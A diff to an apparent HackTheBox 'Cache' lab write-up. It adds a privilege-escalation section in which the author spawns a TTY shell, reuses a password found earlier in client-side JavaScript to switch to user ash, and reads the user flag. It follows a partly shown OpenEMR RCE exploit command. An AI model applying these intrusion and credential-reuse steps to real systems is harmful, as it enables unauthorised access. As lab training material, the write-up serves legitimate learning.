@@ -230,8 +230,41 @@ $ python openemr-rce.py http://hms.htb -u 'openemr_admin' -p 'xxxxxx' -c 'bash -
 
 ![image](/assets/img/post/htb/cache/14_rce-2.png)
 
-
+We now successfully gained RCE from the Cache box.
 
 ## Privilege Escalation
+
+### www-data --> ash (Password Reuse)
+
+When we look at the `/etc/passwd` for the existing users, we can see that `ash` exists.
+
+```console
+$ cat /etc/passwd
+cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+...snip...
+ash:x:1000:1000:ash:/home/ash:/bin/bash
+luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
+memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
+mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
+```
+
+We know that his password was once found within the `client-side` JavaScript. After spawning a TTY shell, we can now change the user context to `ash` and read the `user.txt` file.
+
+```console
+www-data@cache:/var/www/hms.htb/public_html/interface/main$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+<ain$ python3 -c 'import pty;pty.spawn("/bin/bash")'        
+www-data@cache:/var/www/hms.htb/public_html/interface/main$ su -l ash
+su -l ash
+Password: H@v3_fun
+
+ash@cache:~$ id
+id
+uid=1000(ash) gid=1000(ash) groups=1000(ash)
+ash@cache:~$ cat user.txt
+cat user.txt
+62d492ad4164d22a52ce600d22b2c6f2
+```
 
 
